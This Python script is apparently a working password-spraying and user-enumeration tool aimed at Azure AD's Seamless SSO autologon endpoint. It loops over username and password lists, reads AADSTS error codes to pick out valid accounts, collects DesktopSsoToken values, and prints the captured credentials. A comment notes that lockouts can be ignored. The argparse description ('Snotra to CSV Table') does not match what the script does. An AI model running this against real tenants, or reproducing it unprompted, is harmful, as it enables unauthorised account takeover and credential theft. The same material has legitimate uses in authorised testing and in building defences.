#!/usr/bin/python3
import requests
import uuid
import xml.etree.ElementTree as ET
import re
import argparse
import os
import sys

def main():
    parser = argparse.ArgumentParser(description="Snotra to CSV Table")
    parser.add_argument(
        "-u",
        help="username of file containing list of usernames, format user@doimain",
        dest="u",
        required=True,
        metavar="username"
    ),
    parser.add_argument(
        "-p",
        help="password or absolute path to file containing list of passwords",
        dest="p",
        required=True,
        metavar="password"
    ),
    parser.add_argument(
        "-d",
        help="domain",
        dest="d",
        required=True,
        metavar="domain"
    )

    args = parser.parse_args()

    if os.path.exists(args.u):
        with open(args.u, 'r') as f:
            users = f.read().splitlines()
    else:
        users = [ args.u ]
    
    if os.path.exists(args.p):
        with open(args.p, 'r') as f:
            passwords = f.read().splitlines()
    else:
        passwords = [ args.p ]

    domain = args.d

    raw_xml = '''<?xml version="1.0" encoding="UTF-8"?>
        <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
        <s:Header>
            <a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
            <a:MessageID>urn:uuid:{message_id}</a:MessageID>
            <a:ReplyTo>
            <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
            </a:ReplyTo>
            <a:To s:mustUnderstand="1">https://autologon.microsoftazuread-sso.com/dewi.onmicrosoft.com/winauth/trust/2005/usernamemixed?client-request-id={client_request_id}</a:To>
            <o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" s:mustUnderstand="1">
            <u:Timestamp u:Id="_0">
                <u:Created>2019-01-02T14:30:02.068Z</u:Created>
                <u:Expires>2019-01-02T14:40:02.068Z</u:Expires>
            </u:Timestamp>
            <o:UsernameToken u:Id="uuid-{username_token}">
                <o:Username>{username}</o:Username>
                <o:Password>{password}</o:Password>
            </o:UsernameToken>
            </o:Security>
        </s:Header>
        <s:Body>
            <trust:RequestSecurityToken xmlns:trust="http://schemas.xmlsoap.org/ws/2005/02/trust">
            <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
                <a:EndpointReference>
                <a:Address>urn:federation:MicrosoftOnline</a:Address>
                </a:EndpointReference>
            </wsp:AppliesTo>
            <trust:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</trust:KeyType>
            <trust:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</trust:RequestType>
            </trust:RequestSecurityToken>
        </s:Body>
        </s:Envelope>
    '''

    creds = []
    valid_users = []

    for user in users:
        username  = "{}@{}".format(user, domain)

        for password in passwords:

            print("trying {} : {}".format(username, password))

            message_id = str(uuid.uuid4())
            client_request_id = str(uuid.uuid4())
            username_token = str(uuid.uuid4())

            headers = {
                "client-request-id" : client_request_id,
                "return-client-request-id" : "true",
                "Content-type" : "application/soap+xml; charset=utf-8"
            }

            # burp
            proxies = { 
                "http"  : "http://127.0.0.1:8080/",
                "https" : "https://127.0.0.1:8080/"
            }

            login_url = "https://autologon.microsoftazuread-sso.com/{domain}/winauth/trust/2005/usernamemixed?client-request-id={client_request_id}".format(domain=domain, client_request_id=client_request_id)
            xml = raw_xml.format(username=username, password=password, message_id=message_id, client_request_id=client_request_id, username_token=username_token)

            # Login Attempt
            #response = requests.post(login_url, headers=headers, data=xml, proxies=proxies, verify=False) # burp
            response = requests.post(login_url, headers=headers, data=xml)

            if response.status_code == 400:
                content = ET.fromstring(response.content)
                text = content.find("{http://www.w3.org/2003/05/soap-envelope}Body/{http://www.w3.org/2003/05/soap-envelope}Fault/{http://www.w3.org/2003/05/soap-envelope}Detail/{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}error/{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}internalerror/{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}text").text

                if re.match("AADSTS50034" , text):
                    print("user {} does not exist".format(username))
                    break

                if re.match("AADSTS50053" , text):
                    print("user {} exists and the correct username and password were entered, but the account is locked".format(username))
                    creds.append("{}:{}".format(username, password))
                    #break # although this error indicates the account is locked, the lock doesnt seem to apply and can be ignored.

                if re.match("AADSTS50056" , text):
                    print("user {} exists but does not have a password in Azure AD".format(username))
                    break

                if re.match("AADSTS50126" , text):
                    print("user {} exists, but the wrong password ({}) was entered".format(username, password))
                    valid_users.append(username)

                if re.match("AADSTS80014" , text):
                    print("user {} exists, but the maximum Pass-through Authentication time was exceeded".format(username))
                    valid_users.append(username)
                    break

            if response.status_code == 200:
                content = ET.fromstring(response.content)
                sso_token = content.find("{http://www.w3.org/2003/05/soap-envelope}Body/{http://schemas.xmlsoap.org/ws/2005/02/trust}RequestSecurityTokenResponse/{http://schemas.xmlsoap.org/ws/2005/02/trust}RequestedSecurityToken/{urn:oasis:names:tc:SAML:1.0:assertion}Assertion/DesktopSsoToken").text
                if sso_token:
                    creds.append("{}:{}:{}".format(username, password, sso_token))
                    break

    if creds:
        print("\nCREDS")
        print("username:password:ssotoken")
        print("---")
        for cred in creds:
            print(cred)
    else:
        print("\nno valid creds found")
    
    if valid_users:
        print("\nUSERS")
        print("---")
        for user in set(valid_users):
            print(user)
    else:
        print("\nno valid usernames found")


if __name__ == "__main__":
    main()


'''
# "https://login.microsoftonline.com/common/userrealm/$username" + "?api-version=1.0"

# AADSTS50034 	The user does not exist
# AADSTS50053 	The user exists and the correct username and password were entered, but the account is locked
# AADSTS50056 	The user exists but does not have a password in Azure AD
# AADSTS50126 	The user exists, but the wrong password was entered
# AADSTS80014 	The user exists, but the maximum Pass-through Authentication time was exceeded 

400
<Element '{http://www.w3.org/2003/05/soap-envelope}Envelope' at 0x7f78485c7860>
<Element '{http://www.w3.org/2003/05/soap-envelope}Header' at 0x7f7847067590>
<Element '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}pp' at 0x7f7847067540>
<Element '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}serverVersion' at 0x7f78470674a0>
<Element '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}authstate' at 0x7f7847067360>
<Element '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}reqstatus' at 0x7f78470672c0>
<Element '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}serverInfo' at 0x7f78470671d0>
<Element '{http://www.w3.org/2003/05/soap-envelope}Body' at 0x7f78470678b0>
<Element '{http://www.w3.org/2003/05/soap-envelope}Fault' at 0x7f7847067950>
<Element '{http://www.w3.org/2003/05/soap-envelope}Code' at 0x7f78470679f0>
<Element '{http://www.w3.org/2003/05/soap-envelope}Value' at 0x7f7847067a90>
<Element '{http://www.w3.org/2003/05/soap-envelope}Subcode' at 0x7f7847067b30>
<Element '{http://www.w3.org/2003/05/soap-envelope}Value' at 0x7f7847067b80>
<Element '{http://www.w3.org/2003/05/soap-envelope}Reason' at 0x7f7847067c70>
<Element '{http://www.w3.org/2003/05/soap-envelope}Text' at 0x7f7847067d60>
<Element '{http://www.w3.org/2003/05/soap-envelope}Detail' at 0x7f7847067e50>
<Element '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}error' at 0x7f7847067ea0>
<Element '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}value' at 0x7f7847067ef0>
<Element '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}internalerror' at 0x7f7847067f40>
<Element '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}code' at 0x7f7847067f90>
<Element '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}text' at 0x7f7847071040>

200
<Element '{http://www.w3.org/2003/05/soap-envelope}Envelope' at 0x7f03f49a8bd0>
<Element '{http://www.w3.org/2003/05/soap-envelope}Header' at 0x7f03f4988130>
<Element '{http://www.w3.org/2005/08/addressing}Action' at 0x7f03f49b0270>
<Element '{http://www.w3.org/2005/08/addressing}To' at 0x7f03f49b0180>
<Element '{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd}Security' at 0x7f03f49b0310>
<Element '{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd}Timestamp' at 0x7f03f49b0360>
<Element '{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd}Created' at 0x7f03f49b03b0>
<Element '{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd}Expires' at 0x7f03f49b0450>
<Element '{http://www.w3.org/2003/05/soap-envelope}Body' at 0x7f03f49b0540>
<Element '{http://schemas.xmlsoap.org/ws/2005/02/trust}RequestSecurityTokenResponse' at 0x7f03f49b05e0>
<Element '{http://schemas.xmlsoap.org/ws/2005/02/trust}TokenType' at 0x7f03f49b0630>
<Element '{http://schemas.xmlsoap.org/ws/2004/09/policy}AppliesTo' at 0x7f03f49b0680>
<Element '{http://www.w3.org/2005/08/addressing}EndpointReference' at 0x7f03f49b06d0>
<Element '{http://schemas.xmlsoap.org/ws/2005/02/trust}Lifetime' at 0x7f03f49b0720>
<Element '{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd}Created' at 0x7f03f49b0770>
<Element '{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd}Expires' at 0x7f03f49b0810>
<Element '{http://schemas.xmlsoap.org/ws/2005/02/trust}RequestedSecurityToken' at 0x7f03f49b08b0>
<Element '{urn:oasis:names:tc:SAML:1.0:assertion}Assertion' at 0x7f03f49b0950>
<Element 'DesktopSsoToken' at 0x7f03f49b09a0>
<Element '{http://schemas.xmlsoap.org/ws/2005/02/trust}RequestedAttachedReference' at 0x7f03f49b09f0>
<Element '{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd}SecurityTokenReference' at 0x7f03f49b0a40>
<Element '{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd}KeyIdentifier' at 0x7f03f49b0a90>
<Element '{http://schemas.xmlsoap.org/ws/2005/02/trust}RequestedUnattachedReference' at 0x7f03f49b0ae0>
<Element '{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd}SecurityTokenReference' at 0x7f03f49b0b30>
<Element '{http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd}KeyIdentifier' at 0x7f03f49b0b80>
'''